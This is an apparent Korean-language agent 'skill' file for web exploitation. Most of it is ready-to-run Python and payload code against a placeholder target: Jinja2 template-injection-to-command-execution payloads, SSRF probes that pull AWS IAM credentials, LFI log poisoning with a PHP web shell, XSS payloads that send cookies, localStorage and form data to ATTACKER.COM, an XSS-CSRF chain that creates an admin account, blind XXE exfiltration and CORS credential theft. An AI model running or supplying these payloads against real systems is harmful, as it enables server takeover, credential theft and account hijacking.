# SKILL: Web Vulnerability Testing

## 목적
XSS, SSRF, LFI, SSTI, RCE, XXE 등 웹 취약점의 심화 탐지 및 익스플로잇.

---

## SSTI → RCE 익스플로잇

SSTI 탐지 후 RCE로 에스컬레이션:

```python
import httpx

client = httpx.Client(verify=False, timeout=15)
target_url = "https://TARGET/page?name=test"

# Jinja2 RCE 페이로드 (단계별)
jinja2_rce = [
    # 단계 1: 수식 확인
    "{{7*7}}",                                          # → 49
    # 단계 2: 클래스 접근
    "{{''.__class__.__mro__}}",
    # 단계 3: 서브클래스 목록
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    # 단계 4: subprocess 찾기 (인덱스는 버전마다 다름)
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
    # 단계 5: 안전한 RCE 방식
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__.os.popen('id').read()}}",
    "{{get_flashed_messages.__globals__['current_app'].config}}",
]

for payload in jinja2_rce:
    import urllib.parse
    url = target_url.replace("test", urllib.parse.quote(payload))
    r = client.get(url)
    if "uid=" in r.text or "root" in r.text:
        print(f"[SSTI RCE] Command executed!")
        print(f"  Payload: {payload}")
        print(f"  Output: {r.text[:300]}")
        break
    elif "49" in r.text and payload == "{{7*7}}":
        print(f"[SSTI] Confirmed Jinja2!")
```

---

## SSRF → 내부 네트워크 스캔

```python
import httpx, concurrent.futures

client = httpx.Client(verify=False, timeout=5)
ssrf_url = "https://TARGET/fetch?url="

# AWS 메타데이터 → IAM 자격증명 탈취
aws_paths = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
]
for path in aws_paths:
    r = client.get(ssrf_url + path)
    if r.status_code == 200 and len(r.text) > 10:
        print(f"[SSRF→AWS] {path}")
        print(f"  {r.text[:200]}")

# 내부 서비스 스캔
internal_targets = [
    "http://127.0.0.1:6379/",        # Redis
    "http://127.0.0.1:27017/",       # MongoDB
    "http://127.0.0.1:9200/",        # Elasticsearch
    "http://127.0.0.1:11211/",       # Memcached
    "http://127.0.0.1:5432/",        # PostgreSQL
    "http://127.0.0.1:3306/",        # MySQL
    "http://127.0.0.1:8080/",        # Internal app
    "http://127.0.0.1:8500/",        # Consul
    "http://127.0.0.1:2379/",        # etcd
]
for t in internal_targets:
    r = client.get(ssrf_url + t)
    if r.status_code != 0:
        print(f"[SSRF→INTERNAL] {t} → {r.status_code} ({len(r.text)}B)")
```

---

## LFI → RCE 체인

```python
import httpx

client = httpx.Client(verify=False, timeout=10)
base = "https://TARGET"

# 방법 1: Log Poisoning (Access Log)
# 1-1. User-Agent에 PHP 코드 주입
client.get(f"{base}/",
           headers={"User-Agent": "<?php system($_GET['cmd']); ?>"})

# 1-2. LFI로 로그 파일 실행
lfi_logs = [
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "/proc/self/environ",
]
for log in lfi_logs:
    r = client.get(f"{base}/page?file=../../../../../../{log}&cmd=id")
    if "uid=" in r.text:
        print(f"[LFI→RCE] Log poisoning via: {log}")
        print(f"  Output: {r.text[:200]}")

# 방법 2: PHP Wrapper
wrappers = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",  # <?php system($_GET['cmd']); ?>
    "expect://id",
    "phar://uploads/shell.jpg/shell.php",
]
for wrapper in wrappers:
    r = client.get(f"{base}/page?file={wrapper}&cmd=id")
    if "uid=" in r.text or len(r.text) > 100:
        print(f"[LFI WRAPPER] {wrapper[:60]}")
```

---

## XSS → 세션 탈취

```python
# XSS 페이로드 — 쿠키 탈취
xss_steal_cookie = [
    # 외부 서버로 쿠키 전송
    '<script>new Image().src="http://ATTACKER.COM/steal?c="+document.cookie</script>',
    '<img src=x onerror="fetch(\'http://ATTACKER.COM/steal?c=\'+document.cookie)">',
    '<svg onload="location=\'http://ATTACKER.COM/steal?c=\'+document.cookie">',
    # localStorage 탈취
    '<script>fetch("http://ATTACKER.COM/steal?ls="+JSON.stringify(localStorage))</script>',
    # DOM 기반 credential 수집
    '''<script>
    setTimeout(function(){
        var forms=document.forms;
        for(var i=0;i<forms.length;i++){
            var data=new FormData(forms[i]);
            fetch("http://ATTACKER.COM/steal",{method:"POST",body:data});
        }
    },3000);
    </script>''',
]

# XSS → CSRF 체인
xss_csrf = '''<script>
fetch("/api/admin/users", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({username:"hacker",password:"pwned",role:"admin"}),
    credentials: "include"
});
</script>'''
```

---

## XXE → SSRF / RCE

```python
import httpx

client = httpx.Client(verify=False, timeout=10)
xml_url = "https://TARGET/upload-xml"

# 기본 파일 읽기
xxe_file = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><value>&xxe;</value></data>"""

# SSRF to AWS Metadata
xxe_ssrf = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<foo>&xxe;</foo>"""

# Blind XXE (OOB — Out-of-Band)
# 외부 DTD 파일 (attacker.com/xxe.dtd에 호스팅):
# <!ENTITY % data SYSTEM "file:///etc/passwd">
# <!ENTITY % oob "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%data;'>">
# %oob; %send;
xxe_blind = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://ATTACKER.COM/xxe.dtd">
  %dtd;
]>
<foo>bar</foo>"""

for name, payload in [("File read", xxe_file), ("SSRF", xxe_ssrf)]:
    r = client.post(xml_url, content=payload,
                    headers={"Content-Type": "application/xml"})
    if "root:" in r.text or "ami-id" in r.text:
        print(f"[XXE] {name} succeeded!")
        print(f"  {r.text[:300]}")
```

---

## CORS → 자격증명 탈취

```python
import httpx

client = httpx.Client(verify=False, timeout=10)
api_url = "https://TARGET/api/user/profile"

# 공격자 Origin으로 요청 시 자격증명 포함 응답 확인
r = client.get(api_url, headers={
    "Origin": "https://evil.com",
    "Cookie": "session=YOUR_SESSION"
})
acao = r.headers.get("access-control-allow-origin", "")
acac = r.headers.get("access-control-allow-credentials", "")

if "evil.com" in acao and acac == "true":
    print("[CORS] CRITICAL: Arbitrary origin with credentials!")
    print(f"  Response: {r.text[:300]}")
```

---

## 체크리스트

- [ ] SSTI 확인 → RCE로 에스컬레이션 시도
- [ ] SSRF → AWS/GCP 메타데이터 접근
- [ ] SSRF → 내부 서비스 (Redis, ES, MongoDB) 접근
- [ ] LFI → Log Poisoning → RCE
- [ ] LFI → PHP Wrapper → 소스 읽기
- [ ] XSS → 쿠키 탈취 페이로드
- [ ] XSS → CSRF 체인
- [ ] XXE → 파일 읽기 + SSRF
- [ ] CORS → 자격증명 탈취
